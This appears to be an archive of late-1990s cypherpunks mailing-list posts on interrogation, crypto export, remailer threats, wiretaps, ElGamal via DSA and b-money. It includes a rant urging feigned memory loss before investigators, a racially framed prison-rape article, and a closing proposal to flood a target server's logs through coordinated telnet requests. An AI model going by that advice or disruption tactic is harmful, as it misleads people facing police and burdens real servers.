these children how to behave in the presence of criminal inquisitors?
So _you_ say! They open doors; you walk through them; you can easily find yourself in Wonderland. Don't come crying to _me_!
There is no such thing as a "conversation" with them; there is only an "interrogation." Everything you say is interpreted as an admission, a denial, or an evasion. You are a perp. You are dogshit. You mean you heard more _allegations_? If you're not careful, your neighbours will be the next ones to be
"discovering things we didn't know" about _you_. That's the way they
turn people against targets, and anyone they interview can become
another target in the blink of an eye.

GodDAMN! I'm glad you're not a friend of mine! I don't know if I even

Geez! I wonder what you must gush up about your _enemies_!
Yeah, that's funny. It should also have set off all your alarm bells
that you're dealing with clueless fuckwits who can't find their fly
without a map and whose only interest in life is putting anybody
they can in prison, on any excuse whatsoever. If they can weave together a Circle of Eunuchs or a Cult of the Kernel or a conspiracy of Fanatic Followers of the Seashell, they'll be content to do it. You could tell them that the leader of the militant arm of the Circle is the infamous but cryptic "General Error" and they'd write it down with a straight face.
To you, it's a joke. To them, it's a statement with possible evidentiary value. And nothing's funny.
You don't explain _anything_ to them. You can only give them leads and evidence. Of course, if you *insist* on having such a fucking good memory and on gushing on about all sorts of things, well, don't be surprised if they conclude that you _do_ know a lot about this Toto stuff, after all, and maybe merit another, more probing interview.
I'll _bet_ you did! Sounds like you made a nearly _perfect_ subject for interrogation.
Ooooooo! That sounds _delicious_! You can entertain attorneys with that one. You will be thrilled at the wondrous range of awful expressions they make. Some may even quietly throw up in a corner.
Shows how much _you_ know. And now you get your legal advice from the IRS CID? That's really Nice of them. Did they indemnify should you rely on their advice and get busted or sued? Didn't think so.
"Hyperseriously" is more like it.
You're a regular motormouth, aren't you? Now they have you knowing
a lot more about Toto-ish things than just the email showed, they have you red-flagged as "attempting to draw the agent into arguments about law or the Constitution," they have you flagged as being way too bright for an innocent person, and demonstrating an interest in discussing the technicalities of the law on threats to public officials, which interest, just coincidentally, happens to dovetail quite nicely with the essential subject matter of their investigation. I'd give pretty good odds you're going to get another visit. If you don't have a lawyer present on the next one, I'd say you're, uh, sorry, there's just no other word: _stupid_.
Ooooooo! Lovely! FUD! Big time FUD! Divide and conquer FUD! CJ becomes
the bad guy for not cutting a deal and instead inconveniencing all those busy Cpunks, all of them probably suddenly writing code instead of flaming each other in endless and pointless threads of non-crypto!
Of _course_ it would! More "conversation," leads, admissions,
denials and evasions! More grist for the mill! More perps! Get them
to pick up the tab -- they'll be able to put it on their expense
reports! It's called an informal group interrogation.
Geez, how can bright people be so fucking STUPID?
Doh! It's his _job_ to be interested in a subject matter touching on an active investigation.
Geez! Don't you realize that they _are_ the Dark Side! Have you been living under a rock for the last few decades?
"You know, Gunther, those Gestapo men who visited last night to ask about the Goldblums next door were very polite. One of them expressed great interest in concepts and discussions of Judaism, and Jewish family trees. I described something of what the religion is about and referred him to some libraries and gave him some titles to read. I'm sure, given a little time and several dinners, we could convert him to our side."

I couldn't leap to the conclusion that she is his wife. I
might assume so out of courtesy to them, but I wouldn't presume
to tell someone official that he is Joe or that he has a wife,
because I really don't know. Most of what I _think_ I know,
and which serves quite well for inviting each other to our
barbeques and for borrowing small tools, is stuff I don't
actually _know_ and don't care about one way or another.
And that affects my memory when people ask questions about
him. Did I see those two young men snatch a purse from that lady over there? Yes. Can I describe them? Yes. Did I notice what they were wearing and in which direction they ran? Yes.
Do I know anything about Joe? Nope. Does he have a wife? I
have no idea. What does he do for a living? Gosh, I have no
The law requires you to give up information you have when asked by a law enforcement officer investigating a crime.
The law does not and cannot require you to notice things or
to have a good memory. If your memory gets worse as the
things being investigated stray farther and farther from
common law crimes and into the realm of "bureaucrime" and
thought crime, well, that's just too fucking bad.
I'd make a really bad juror, too. It's not a memory thing there,
it's more of a comprehension thing. I just have trouble seeing
guilt if the law itself is bogus. Not guilty. What? Are you
crazy? They had him dead to rights laundering money! Sorry, I
just can't believe the evidence. It just doesn't add up for me.
Explain why not! Sorry, I can't. It just doesn't work for me.
If more people had these problems, all the bureaucrimes and other
victimless crimes would, sadly, be history overnight. The IRS would lose every single case that went to a jury, and within months the income tax would be repealed, a no-audit, no-go-to-
jail sales tax would be in place, and most of the people working for the IRS would be looking for a new job. I would be
very saddened by the rude reality of all that, but, hey, what
the hell?
Will these problems that afflict me spread? You'd better hope your sorry ass they do! If they don't, we're all in for a very
rough ride, and not 50 years from now, but tomorrow and next
year. We're already well down the slippery slope. Personally,
though, I think we're in for a shitstorm. That's because
people are basically unprepared for the degree of evil that
has been refined and distilled in government. They're still
way too willing to spout off about things they don't even know, to presume the worst, even of their friends and acquaintances, to play full rube right into the hands of
truly evil people who have _their_ act down to a science.
If large scale genocide has been going on all through the last
several years in Bosnia while people on this list have been consumed in flame wars and pseudo-propellor-head duels on a
scale of delicacy of the medieval mace, how much more easily
can and does largely bloodless subjugation take place all
around us? If people can allow Ruby Ridges and Wacos to take
place without congressional offices being _filled_ every day
with outraged citizenry and recall petitions being launched
for every politician who even hesitates in taking a firm stand,
how can we think that the gradual sapping of our liberty will
evoke a response until things first get very, very bad.
There is a peaceful solution available today. At one level you
don't have to have a good memory in all things to be a law-
abiding and responsible citizen-unit. Just say "No, I don't
remember" about things that are none of your business. At another level, you don't have to put up with bureaucrimes when you sit on a Grand Jury or a trial jury. Just say "No." Don't argue; don't convince; just say "No" across the board to bureaucrimes. It takes 51% of the voters to win an election. It only takes 5% of the jurors to kill a bad law.
Nothing else will work. Nothing else has ever worked. If this
is not done now, we will all face terrible choices and
tragedies within as few as ten years.

We are not talking here about free stuff. We are talking about products
that can be deployed by non-programmers, businesses etc., that will be
supported professionally (the perceived quality of professional support
vs. free stuff is immaterial here.)
Hardware is overkill for the single voice line. PGPfone works fine there.
If there is a demand, it will be done. Let's run a small poll:
How much would you pay for transparent hardware/software solution that
encrypts all traffic between peer users (assuming all rational crypto
requirements are met, like available source code etc.) ?
The main problem with hard crypto is that it is so equalizing. Any pauper
can cheaply encrypt and make it hard for any government to break. This is
not the case with guns, where more resources almost linearly buy more power.
One of the posters mentioned that PGP is retailed in CompUSA. My mistake, I
did not check them (but I did check 3 other big chains).
On the wild side, suppose that all crypto restrictions are terminated. Some
would say that now "they" can break all available stuff. In any case the
value of crypto products in the eyes of buyers would fall. If it is legal
it is no good. Most of the research would lose the best people. Cypherpunks

If these reports are correct, the United States could end up being one of
the countries with the most LIBERAL export controls.
In the United States, it is currently legal to export any cryptographic
software you like - as long as it is in printed form.  This is because
of fears of violating the First Amendment.  Not all countries have such
strong conventions for protecting the printed word.
PGP source code is being exported in printed form, scanned in overseas,
and then distributed from there.  If the Wassenaar Arrangement prevents
it from being exported from its current overseas distribution site,
a solution can be to ship it in printed form from the U.S. to a wide
range of other countries.  As long as those countries don't prohibit
domestic distribution of crypto software, strong cryptography can still
be made available almost everywhere.
The PGP source code books begin with a section that is, in effect, a
"how-to" for printing software in such a way that it can be reliably
scanned.  Each page and each line has a checksum.  The books come with
a Perl script short enough to enter by hand that does basic checksum
verification.  This is used to read a second, longer Perl script that
can do error correction; and this is then used to bootstrap into the
full script which will read the books, create all the files, organize
the directories, and reconstruct the entire source code tree.
It may be that in the future this will be the most effective way to
communicate internationally about security software.  It would be
good for other groups to become familiar with this technology which has
been pioneered by PGP.

Well, the existing remailer net doesn't make "Pretty Good" anonymity very
feasible. I'd think something based on the general idea behind Crowds.
(Furthermore, most remailer structures still can't erase some other security
concerns --
  1: remailers acutally can be hacked or physically compromised
  2: clients really can be screwed
  3: etc.
To help solve the first, you'd want a two-box setup doing remailing, with the
security-critical stuff loaded on a box not directly connected to the Net with
something 140-1ish to make tampering harder, a secure OS, etc. -- or, of
course, you can scrap all that to get really big remailer count.
To help solve the second problem, there needs to be a better web-of-trust setup -- that is, one which applies to code as well as keys. Those who wish to
verify code get a .sig-verifying program from a trusted source then use a WoT
to authenticate various facets of the program necessary for security.
A solution to the third problem is expected RSN.)
Remember the consequences to an adversary who uses its secret decoder ring,
though: the more plausible it becomes that a certain source is being used for
intelligence-gathering, the more likely it is that that source will promptly
begin to run dry as the spied-upon realize that Something Got Broke.  My
advice, however, agrees with that of the other Anonymous. That is, unless
you've really thought things out, think of an remailed message as merely
.sigless, not anonymous.

Well, you shouldn't have complete trust -- a tamper-resistant net could be
compromised, too -- but there's a good reason to have more trust in it than in
the existing one. More on that after a parenthetical remark.
(This brings up the "hardware web-of-trust" issue; you can set up such a web
with trusted spot-checkers and statistical/cryptographic means of assuring the
user that the box works as advertised, if your threat model demands it.  There's more about it in the "Beyond Class (A1)" section of the Orange Book,
although the section's use to Cypherpunk types is limited because it's written
without any thought to, say, doing things cheaply or having a decentralized
The tamper-resistance simply means that if the mailer was set up secure, it's
not going to become compromised. Instead of having to trust that one of the
remailer operators is currently honest and has always done all the necessary
homework to ensure the system was safe, you have to trust that this entity was
honest and diligent when the remailer was set up (unless, of course, you think
the tamper-resistance was circumvented); if the operator is bribed after the
remailer's set up and the public key is published, there's no way to suddenly
and invisibly make messages traceable, as there is in a "normal" Mixmaster
(This is because, given the normal assumptions about crypto strength, it takes
the remailer's private key to process a Mixmaster-like packet and that key is
generated by and stays within the tamper-resistant box)
My predictions about the biggest attacks on a tamper-resistant remailer net:
  1: traffic analysis. Until the net structure is overhauled, this will always
     be possible.
  2: propagation and exploitation of faulty server software. Related to the
     whole web-of-trust issue.
  3: direct attacks on specific clients. Again, no web of trust.
  4: creation of bad remailers and attempts to shut down good ones. More
     messages could be traced in a world with 6 good and 47 bad remailers than
     in one with 9 good and 3 bad.
  5: direct attacks on new remailers
  6: attempts to make an operator feign a catastrophe and set up a new,
     compromised remailer. Users, however, would know that the new key not      signed by an old one means that they must now trust that the remailer was
     not compromised before the publication of the new key.
  7: attacks on tamper resistance

White men traded as 'sex slaves' of black prisoners
By Fergal Keane, in Illinois
WHITE male prisoners in American jails are being "sold as sex slaves" by
black fellow inmates for money, tobacco, drugs and alcohol, according to
campaigners who are urging action to end widespread homosexual rape
behind bars.
Damaging claims of complicity by prison guards are also emerging. Five
wardens at a Californian maximum security jail are facing charges
relating to the rape of an inmate by a notorious sexual predator. The
wardens allegedly forced a troublesome prisoner to share a cell with a
black gang leader, who was rewarded with extra food and clothes for
imposing "discipline" on the man.
According to the campaigners, the sex attacks often carry ugly racial
overtones, with many white prisoners claiming that they were sexually
abused after being placed in cells with black inmates. Most victims are
too scared to complain, it is claimed, and those that do say they have
been ignored by the authorities. The scale of the scandal has been
uncovered by the pressure group Human Rights Watch, which next year will
publish a report documenting the "staggering prevalence" of prison rape.
The situation is not just provoking concern among civil liberties
groups. In the state of Illinois, a prominent conservative figure,
Republican legislator Cal Skinner, is also pushing for tougher
government action. He claims that many of the rape victims have been
infected with the HIV virus and that American prisons are becoming a
breeding ground for Aids.
Mr Skinner said: "There are sexual slaves in too many prisons. People
are being given a death sentence." He wants to see the mandatory Aids
testing of all prisoners with the segregation of those found to be HIV
positive. He believes it is one of the few ways of protecting vulnerable
inmates from the potentially fatal effect of prison rape.
The renewed concern over rape in prisons has come too late for Michael
Blucker, 29, a white man from Crystal Lake in Illinois, who was
repeatedly gang-raped while serving a sentence for burglary. Blucker's
ordeal is almost too horrific to contemplate: he was forced to become a
sex slave to black prisoners at Menard State Penitentiary in Illinois.
Prison rape is not confined to white victims but they are particularly
vulnerable as black gang members make up such a large part of the
American prison population.
Blucker said: "I was the only white man in a gallery [wing] of more than
100 prisoners. Most of the guys were in for very serious crimes; they
were people who weren't going to be getting out of there any time in the
next 30 years." The first attack came when Blucker had been in jail just
two weeks. He was set upon by three black prisoners, stripped, beaten
and raped.
"They would have killed me if I had refused. Killing means nothing to
these people," he said. Once it became known that he had been raped,
Blucker's life became even more of a nightmare. In the violent world of
American prisons, an inmate who "allows" himself to be raped is regarded
as fair game for every other inmate and is used as a sex slave, normally
under the direction of a senior gang leader.
In Blucker's case, one of the black prisoners sold him to other inmates
on a daily basis. "He would physically threaten me and threaten to have
harm done to my wife outside prison. Every day, I would be sold as a sex
object while he was given money and cigarettes and marijuana and alcohol
in return." When the threats of violence did not cow Blucker, his
tormentor would beat him into submission.
While filming in Butner prison in North Carolina, I met Ivory Rhodes, a
black prisoner, who was attacked within days of being placed in the cell
of a known rapist. The pattern he described was almost exactly the same
as that experienced by Blucker. A violent attack and the threat of death
followed by brutal rape. Rhodes's solution was to try to spend long
periods in solitary confinement, a deprivation he preferred to risking
his life in the main cells.
Rhodes managed to avoid being raped again, but whenever he was
transferred from one prison to another, the stigma of "rape victim" went
with him. After his rape, Rhodes never moved out of his cell without
carrying a knife. He described a world in which any weakness is preyed
upon by the tougher and older inmates. The young, the first-time
offenders, the middle class are especially vulnerable to attack.
Blucker said: "There are people who say that if somebody attacked them
in prison they would kill themselves or kill other people. That is bull.
It just doesn't happen that way."
What was almost certainly his worst experience occurred in the showers
when he was set upon by a large gang of prisoners. "They pulled bricks
out of the wall and they hit me in the nose and the eye and then on the
back of the head, which knocked me out." Then he was repeatedly raped.
"I couldn't tell you if it was one, three, 10 or 15 people. All I know
is that I felt very unwell."
At first, Blucker said, he was too frightened to report the rapes for
fear of being killed by the other inmates, but after the shower incident
he spoke to prison officials. The result, he claimed, was indifference.
"I spoke to officers and medical people and no one believed me."
Blucker subsequently took a court action against several prison guards
and the prison psychiatrist but was unable to prove his claims. What is
not disputed is that he needed extensive surgery for injuries sustained
in the attack and that while in prison he contracted the HIV virus.
Blucker was eventually transferred from Menard after lobbying a local
politician. Now a free man, he is looking for a job and is actively
involved in his church. God, he says, will save him from Aids.

@_subject: Wiretap Operation Sheds Light on LAPD Tactics 
If it is Monday, December 7, 1998, you can go to
 and read about how
Los Angeles police wiretapped a small cellular phone service provider
because his policies were too helpful for drug dealers.  He didn't try
hard enough to verify customer names, he sold cell phones with built in
scramblers, he allowed customers to change phones and numbers easily.
After years of investigation the company owners were never charged,
but a number of their customers were convicted as drug dealers, in many
cases never being told about the phone taps.
It's an ominous account of how privacy-friendly policies can be used by
the police to justify an investigation.
If it's after December 7, read the story here:
:      Los Angeles narcotics officers spent a lot of time spying on John
: Lopez and his small storefront telephone company--Atel Cellular
:      Convinced he was in cahoots with drug dealers by selling secure,
: cop-proof phone service--no questions asked--they staked out his
: Downey office, tailed his customers and finally wiretapped the
: customers' and Atel's phones.
:      Starting with just his business lines and a handful of customers,
: the operation spread like kudzu, eventually covering hundreds of
: phones and thousands of conversations and becoming the largest wiretap
: operation in the history of Los Angeles County.
:      When the three-year probe ended in March, police had arrested
: dozens of Atel's customers, but not Lopez or any of his employees.
:      The Atel taps are at the center of the nine-month legal
: controversy over whether prosecutors have been improperly concealing
: their wiretapping operation and the information derived from it. Also
: at issue are charges by defense lawyers representing Atel customers
: that the allegations against Atel Cellular are a sham created to win
: court orders permitting an electronic fishing expedition against their
: clients.
:      Manager Lopez and Atel's owner, Atil Nath, refused to
: comment. Their lawyers say the two men are not involved in drugs.
:      "The whole concept [of the police wiretap operation] was
: preposterous," said Dale Hardeman, a Downey attorney. "How are we
: supposed to know if customers are involved in criminal activity?"
:      Details of the probe--revealed through interviews, police
: affidavits, wire monitor logs and volumes of court records--provide a
: fascinating inside look at how detectives can mold the legal actions
: of a suspect into criminal scenarios and persuade judges to authorize
: snooping on people's private conversations.
:      The probe also raises broader questions, such as whether many of
: the reasons given for tapping Atel could just as easily be applied to
: other phone companies, and whether wiretaps should be allowed to
: continue indefinitely, even when police work for months without
: finding enough evidence to arrest the target.
:      The 4th Amendment protects phone privacy.
: :      Need for Probable Cause
: :      To tap a phone, prosecutors have to get a court order by showing
: they have sufficient reason, known as probable cause, to believe the
: phone subscriber is committing crimes. Even if a subscriber's actions
: are legal when considered individually, those actions can amount to
: probable cause when viewed as part of a larger picture.
:      If a tap provides a lead or evidence, prosecutors must reveal the
: tap and give transcripts to the defendant before trial.
:      Though the Atel investigation established strong suspicion among
: investigators that Lopez knew he was dealing with drug traffickers, it
: fell far short of proving it.  But police were getting a steady supply
: of leads against his customers as well as new phone numbers of people
: they considered suspicious. So they kept going back to court for
: extensions and new taps.
:      Police referred all questions about the case to prosecutors, who
: defend the wiretap practice, saying they had sufficient evidence to
: suspect Lopez of wrongdoing.
:      Dist. Atty. Gil Garcetti noted in a prepared statement that the
: operation had court approval. He said police targeted Atel because
: they believed most of its business was providing phones to drug
: dealers without requiring them to provide any personal information.
:      Superior Court Judge John Ouderkirk, who approved most of the
: orders, said he could not discuss pending cases.
:      Not much is known about Lopez and Nath. Nath lives in a two-story
: home in a neat, well-kept neighborhood in Downey. Lopez lives in Pico
: Rivera with his wife, Maria, and their children. Both have said in
: court papers that they have no criminal record. Their company is one
: of about three dozen small phone companies in Los Angeles County that
: resell or sublease service and equipment.
:      Police say the closest they came to showing a direct connection
: between Lopez and drugs was during a stakeout at his home when they
: saw a man arrive in a pickup truck registered to a member of what they
: say is a drug gang.
:      The investigation grew out of, and, in many ways, was modeled
: after a 1994 wiretap of Downey Communications, another small retailer
: of phone services. As in the Atel probe, police staked out the
: business and collected information for wiretap orders.
:      During hours of surveillance, they watched customers arrive and
: leave. They noticed the types of vehicles they drove. They even took
: notes on their manner of dress, eventually deciding that silk floral
: shirts, pressed denim, hand-stitched leather belts and expensive
: cowboys boots were haute couture on the L.A. drug scene.
:      Police claimed that Downey leased to drug dealers and was
: "heavily involved in the sale and transportation of narcotics."
: Officers would later use the same language in Atel affidavits.
:      The Downey wiretaps lasted a year. They ended in drug and cash
: seizures and 12 indictments, including one against the brother of
: Downey's owner. But the owners and employees of Downey were not
: arrested. The owner said in court papers he was never interviewed by
: police, was not aware of the investigation and has never been charged
: with a crime.
:      Police used the Downey Communications probe as a springboard to
: Atel.
:      The connection was tenuous.  Downey and Atel customers shared the
: same taste in cars and fashion.  Downey employees were seen paying
: short visits to Delta Tri-Telesis, a now-defunct cellular phone
: business owned by Nath and operated by Lopez.
:      So in September 1995, officers turned their binoculars on Atel,
: which had taken Delta's customers.  They often saw customers in cars
: registered to targets of previous drug probes going to houses once
: used as drug "stash" sites and employing what police considered
: "counter-surveillance" driving.
: :      Reports on Surveillance
: :      Investigators say they saw Lopez use such techniques when they
: were tailing him in May 1996, shortly before they started tapping his
: business phones. They said they saw him on the freeway changing lanes
: erratically and driving "at a high rate of speed in excess of 70 miles
: per hour," later making a U-turn on Arrington Avenue and lingering too
: long--three minutes--at an intersection.
:      Police also noted in affidavits that Lopez sold money counters
: and phone scramblers; that he apparently didn't care if customers gave
: him fictitious names; that he let customers change numbers quickly and
: easily.
:      Drug suspects were frequently found with Atel phones.
:      Police saw what they considered suspicious calling patterns--too
: many calls in a short period of time--among groups of Atel customers.
:      Although such evidence was far from enough to file charges
: against Lopez and Nath, legal experts say it was sufficient as
: probable cause for a court order, which was granted in May 1996 for 30
: days.
:      After a month of wiretapping, Garcetti's prosecutors--armed with
: transcripts of tapped phone conversations--were back in court asking
: for the first extension of the court order and for permission to tap
: new telephone numbers. From then on, requests for extensions built on
: previous ones. Police eventually received 19 extensions.
:      Although the taps provided a mother lode of leads against drug
: dealers, they seldom offered much evidence against Atel. There was one
: conversation that police described in an affidavit as particularly
: damning for Lopez. It was on June 25, 1996, from "Oscar," who had been
: under police surveillance.
:      "Hey John, this number is no good," Oscar tells Lopez.
:      Lopez: Not good?
:      Oscar: They're on me again!  Right behind.
:      Lopez: OK, bring it in now!
:      But most of Lopez's conversations in the affidavits simply
: confirmed what police already knew: that customers dealt directly with
: Lopez, that Lopez based billing records on phone numbers instead of
: names and that he handled billing arrangements by phone.
:      In contrast, the conversations among customers were
: fruitful. Most were cryptic discussions about drug deals, pickup
: locations, delivery times, police said. According to investigators,
: they never mentioned drugs, using words such as "ladies," "stuff" or
: simply a number understood to be an amount of drugs.
:      For example, in June 1996, police overheard this exchange:
:      Receiver: How do they look?
:      Caller: Real good. How many do you have?
:      Receiver: 40 plus 5 out, plus some lying around.
:      Caller: OK. I'll hold whatever else I have.
:      Without interpretation by detectives, there is little indication
: that that conversation is about drugs.
:      By the time the operation ended in March, police had tapped close
: to 400 Atel phones.
:      The wiretap controversy erupted that month because San Diego
: attorney Philip DeMassa and two other lawyers discovered that the case
: against their clients sprang from information garnered from the Atel
: taps and handed off to other officers who were not told of the taps so
: they would not have to reveal them to defense lawyers.  Later, Deputy
: Public Defender Kathy Quant went to court for indigent defendants.
:      Garcetti acknowledged in June that he withheld tap information in
: 58 cases and he agreed to notify defendants about future taps.
: Although a judge upheld the wiretap handoff practice last month, with
: some qualifications, Quant is considering an appeal. Other defense
: lawyers are challenging whether Garcetti has revealed all tap cases.
:      Whatever the outcome, the probe clearly helped police arrest some
: of Atel's customers. It netted large amounts of narcotics, about $8
: million in drug proceeds and dozens of arrests.
:      Lawyers base their doubts about the investigation of Nath and
: Lopez partially on the fact that it lasted three years and police
: never tried to interview them. In fact, DeMassa alleges in court
: papers that Lopez and Nath are actually police informants or are
: perhaps cooperating through a grant of immunity from prosecution, an
: assertion prosecutors call absurd.
:      DeMassa is hoping to show that police misled the courts when they
: said they were investigating Lopez and Nath.
:      If Nath and Lopez were such an integral part of a gigantic drug
: trafficking operation, the police should be trying to protect the
: public from them, he said.
:      "Why isn't anything happening to these guys?" he said.
: :      Acts Were Not Illegal, Critics Say
: :      None of Atel's acts described in the affidavits was illegal,
: Quant and other critics say.  Well-known phone companies engage in
: many of the same practices, Quant said. If police use the same
: standards elsewhere, any companies, especially small retailers, may be
: vulnerable to taps.
:      Many of the actions cited in Atel affidavits are suspicious only
: in the eyes of police, Quant said.  Money counters are legitimate, and
: other firms advertise "no eavesdropping" cell phones because
: legitimate businesses need secure communications, she said.
:      There is nothing suspicious, for example, about high usage of
: cell phones, particularly among real estate agents, salespeople, even
: news reporters, Quant said.  And other small retailers allow people to
: change numbers frequently.
:      Regardless of Atel's guilt or innocence, what police did to Atel
: could be done to any legitimate businesses, she said.
:      Deputy Dist. Atty. Robert Schirn dismissed that notion.
:      "That's quite a stretch," he said.
:      "Atel was a facilitator and made it possible for drug dealers to
: break the law," he said.
:      Yet Schirn acknowledged that he could not point to any conclusive
: evidence that Nath and Lopez knew that some of their customers were
: drug dealers.
:      He said he didn't know if police tried to persuade defendants to
: testify against Nath or Lopez.  Even if they did, prosecutors would
: need more evidence than the tainted testimony of accomplices to make
: an arrest, he said.
:      As for Atel, Hardeman said his clients had no idea some of their
: customers were criminals.
:      "This investigation has virtually destroyed them," he said.

@_subject: DSA for encryption 
Good idea!
It may not be so easy to get people to set up port-forwarding programs.
These could be a target for hackers seeking to cover their tracks as they
try break-ins.  Also, how many people in this day of commercial ISPs are
able to set up port-forwarding programs?
It would seem more promising to make your web page script be simple
and portable enough that even users of AOL and free webpage hosts like
GeoCities would be able to install it.
DSA per se is probably not your best choice - unless you already have a
DSA implementation which you want to try to use.  DSA is a signature
algorithm, and while it is sometimes possible to use a DSA implementation
to do encryption, it is not particularly convenient.
What you want to do is to use the mathematical principle behind DSA, which
is the difficulty of solving the discrete log problem, and use an encryption
algorithm which relies on that same math problem, namely Diffie-Hellman or
ElGamal encryption.
If you need to use DSA, Bruce Schneier describes in his book Applied
Cryptography how to get the effect of ElGamal encryption.  Here is what
he writes, on page 490:
: ElGamal Encryption with DSA
: : There have been allegations that the government likes the DSA because it is
: only a digital signature algorithm and can't be used for encryption.  It is,
: however, possible to use the DSA function call to do ElGamal encryption.
: : Assume that the DSA algorithm is implemented with a single function call:
: :     DSAsign (p, q, g, k, x, h, r, s)
: : You supply the numbers p, q, g, k, x, and h, and the function returns the
: signature parameters: r and s.
: : To do ElGamal encryption of message m with public key y, choose a random
: number k, and call
: :     DSAsign (p, p, g, k, 0, 0, r, s)
: : The value of r returned is a in the ElGamal scheme.  Throw s away.  Then,
: call
: :     DSAsign (p, p, y, k, 0, 0, r, s)
: : Rename the value of r to be u; throw s away.  Call
: :     DSAsign (p, p, m, 1, u, 0, r, s)
: : Throw r away.  The value of s returned is b in the ElGamal scheme.  You now
: have the ciphertext, a and b.
: : Decryption is just as easy.  Using secret key x, and ciphertext messages
: a and b, call
: :     DSAsign (p, p, a, x, 0, 0, r, s)
: : The value r is a^x mod p.  Call that e.  Then call
: :     DSAsign (p, p, 1, e, b, 0, r, s)
: : The value s is the plaintext message, m.
: : This method will not work with all implementations of DSA.  Some may fix
: the value sof p and q, or the lengths of some of the other parameters.
: Still, if the implementation is general enough, this is a way to encrypt
: using nothing more than digital signature function.
If you need more information about what the various values mean, or how
to create a DSA and/or ElGamal key, just ask.
Really, ElGamal is simple enough that if you have access to a large-number
math package, writing your own is probably easier than trying to get DSA
to do it.  It is unlikely that you will find a DSA implementation which
allows you to specify all the needed parameters above, particularly h
and k.  Usually h is forgotten after key generation and not used during
signature, and implementions will probably want to choose k themselves
since it is a very sensitive parameter.

The description is intended to show how money is transferred, and how it

It is not anticipated that most people will make money by using their
computing power.  That feature is only used when the money supply needs
to expand, because of increased economic activity.
Instead, people will generally get money the same way they do today:
someone will give it to them, either as a gift or as payment.  You are
free to give your money to whomever you want to, and you are free to
offer your goods and services in exchange for money.  Such exchanges
of money should be much greater in volume than the amount of new money
which is created by burning computer cycles.

I think setting up mirror sites of crypto archives across the world is a great idea.  However, I also think we need to focus on getting more and more people to use crypto.  I would guess that the vast majority of computer users worldwide see no use for encryption in their day-to-day lives -- and even those that do don't also use it.
If everybody in the world is using encryption, it is going to be extremely difficult for "democratic" governments to tell them they can't use it any more.
Unfortunately, it's easy for governments to blame crypto for terrorism and a host of other crimes, simply because the average citizen doesn't understand the concept of an "electronic envelope".

@_subject: alternative b-money creation 
Bill Stewart writes, regarding Wei Dai's b-money protocol:
B-money is not fiat money.  It is better to think of it as commodity
money.  Unlike most commodity money, in this case the commodity is not
intrinsically valuable.  However it is scarce, and more can be created
only at a considerable cost.  An analogy might be money based on a rare
earth element like Terbium (which, let's suppose, has no industrial uses).
Terbium based money would be immune to inflation, like gold backed money,
but the element is not valuable in itself; it is only valuable for its
role as money.
This leads to an important difference between b-money and fiat money.
The value of b-money is not set by fiat.  The value is determined
automatically by the workings of the market and the workings of the
There is no centralized agency to make b-money legal tender, or to set
its value in terms of other currencies.  Most importantly, there is no
agency which can issue new b-money, inflating and devaluing the currency.
Money is a store of value and a medium of exchange.  B-money is admirably
suited for these purposes, much better than fiat money.  The quantity of
b-money in a mature system is, roughly speaking, constant.  (The quantity
may grow, but it will do so slowly, based on the increased demand for
b-money.)  B-money is an investment which will hold its value.  Because
it can be exchanged electronically, it is much more flexible as a medium
of exchange than existing forms of money.
Think of this CPU-burning as the effort to mint or mine new b-money.
Like other commodity based money, and unlike fiat money, b-money cannot
be printed.  New b-money can only be added to the money supply by virtue
of expending work.  This is what insures that there is no inflation.
You could say the same thing about gold mining, in the days when gold
was money.  Most gold went into circulation as coins, not adding beauty
or value to the economy.  Its only utility was as an increase in the money
But, of course, adding to the money supply is an important contribution.
To have a stable commodity money, it must be costly to create more,
and the cost must be "wasteful" in the sense that it is not compensated
other than by the monetary value of the newly produced money.  Otherwise
you will get excessive inflation.
It's ironic for people to complain that b-money is inferior, in a world
in which fiat money is universal.  Once the mathematics of b-money are
better established and understood, and once the technical issues are
clarified and problems solved, this appears to be a very attractive
alternative to fiat money.  Unlike commodities such as gold, it can be
easily exchanged electronically.  And unlike fiat money, it is immune
to attempts to manipulate the money supply.
B-money could easily attract investment as an inflation-proof store of
value.  This may be enough to initiate the bootstrapping process.  People
can buy b-money as a store of value, and once they hold it they will want
to be able to spend it.  This will lead to a demand for merchants to
accept it, and the process has begun.

In either case, you need to be sure that changed data is always encrypted with
different parameters -- that is, a changed file should be encrypted with a new
IV or different offset into S1 and S2. Otherwise, the attacks used to recover
badly wiped information could be used to look back in time, so to speak, and
figure out which portions of the file were changed. It's more of a problem if
you're using ofb o ecb o ofb (i.e., the CFS mode) than an interleaved CBC mode.
The 8-way interleaved CBC mode should have different IVs for each "lane" (that
is, a monster 512-bit IV) -- otherwise, files data types with repetitions in
the headers could be identified. The IV should be secret to completely rule out
leakage. However, there are some important restrictions on how you can use the
key in making an IV -- I suggest something like this to ensure nothing is
messed up: hash the passphrase into K0, use nDES-OFB with K0 to make a K1 and
K2, then nDES-OFB with K1 for making the IVs which nDES-interleaved-CBC uses
with K2 for the actual encryption.

@_subject: DoS considered harmful [WAS: RE: Anyone striking?] 
Hmm... I agree that Peter's representation of my suggestion would not be a
good idea nor would it be productive-- especially in the long run.  And his
interpretation of my writing was correct given the current understanding of
what a DoS is.  So let me flesh out a bit what I think option c) above
should have said.
In my first mail to the list on the strike subject I offered a couple
references outlining some possible forms of electronic civil disobedience
(ECD).  The analogy used in those texts is to a "sit in" or, as explained in
other references not mentioned, the activity can be looked at as a large
scale letter writing campaign like the ones organized by Amnesty
International which are aimed at prison officials holding political
dissidents or political prisoners.  The idea is to maximize awareness (to
the targets as well as mass media) of the protest while minimizing the
likelyhood of severe litigation or other punitive action against those
involved in the protest.  It's basically an indismissible show of dissent in
large numbers aimed directly at the source of the dissent.
As commonly understood, a DoS (Denial of Service) attack would entail an
undisclosed group of hackers and script kiddies attempting to knock out a
server/site for as long as possible-- which usually requires that the group
be destructive and remaining as anonymous and untrackable as possible.  This
was _not_ what I had in mind as option c).
In an effective ECD campaign you would want to publicize what your agenda is
including a listing of possible spokespersons/leaders for negotiation to
both the target and the media.  You would also want to control the extent of
the Disruption of Service (instead of Denial of Service) to somewhere
between more than barely being noticed to less than breaking any laws.
Example: A public web page is setup with information on the next "sit in" or
"log writing campaign" containing the agenda behind the protest, contact
persons for more information, target site with explanation of choice, start
time and stop time.  Let's further that the cause is able to get a couple
hundred or couple thousand supporters to, for example, repeatedly telnet to
port 80 on the remote server during a specific 5 minute window and type in:
GET I do not support your sites views on such and such see
 for details.
Given the right level of logging on the server you'd quickly fill up the
target's logs with a record of the number of people (or actually computers)
that don't agree with the target's agenda.  In Trei's last copied paragraph
